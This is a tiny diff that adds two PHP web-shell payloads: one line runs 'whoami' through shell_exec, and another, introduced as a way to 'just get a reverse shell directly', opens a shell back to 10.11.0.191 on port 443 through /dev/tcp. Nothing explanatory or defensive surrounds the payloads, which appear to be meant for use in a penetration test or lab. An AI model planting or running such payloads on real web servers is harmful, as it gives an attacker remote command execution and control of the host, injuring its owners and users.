@@ -1,0 +1,4 @@
+<?php echo shell_exec("whoami");?>
+
+# Or just get a reverse shell directly like this:
+<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
